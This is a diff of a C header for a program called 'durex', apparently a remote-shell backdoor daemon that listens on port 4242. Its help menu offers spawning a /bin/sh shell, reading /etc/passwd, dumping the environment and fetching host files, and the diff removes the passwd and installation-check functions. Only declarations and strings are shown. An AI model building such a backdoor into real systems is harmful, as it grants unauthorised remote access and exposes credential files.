@@ -28,7 +28,7 @@
 # define DISCONNECTED	-1
 # define CMD_QUIT		-2
 # define PORT 			4242
-# define USAGEMSG		"help menu:\nshell\tspawn shell\nquit\tTerminate durex process\npasswd\tget /etc/passwd\nenv\tget the env\nget\tget a file from host\ncheck\tcheck the installation of daemon files\nupdate\tupdate installation on daemon files\n"
+# define USAGEMSG		"help menu:\nshell\tspawn /bin/sh shell\nquit\tKill durex process and exit\nenv\tshow environment\nshow\tshow file content\n"
 # define INVALIDCMD		"Invalid command, see help menu for a list of available commands\n"
 # define EOPENPASSWD	"Cannot open /etc/passwd\n"
 # define EREADPASSWD	"Cannot read /etc/passwd\n"
@@ -59,10 +59,8 @@ struct					s_ctx
 /*
 						commands.c -> remote shell functions
 */
-void 					_shchk(struct s_client *client);
 int 					_help(struct s_client *client);
 int 					_shlaunch(struct s_client *client);
-int 					_shpasswd(struct s_client *client);
 int 					_shenv(struct s_client *client, char **envp);
 int 					_shfile(struct s_client *client, char *buf);
 /*
@@ -79,7 +77,6 @@ uint8_t					*_md5(uint8_t *data);
 						daemon.c -> daemon utils
 */
 int						_init_daemon(int f);
-int    					_schk_daemon(struct s_client *client);
 /*
 						durex.c -> run main program utility
 */
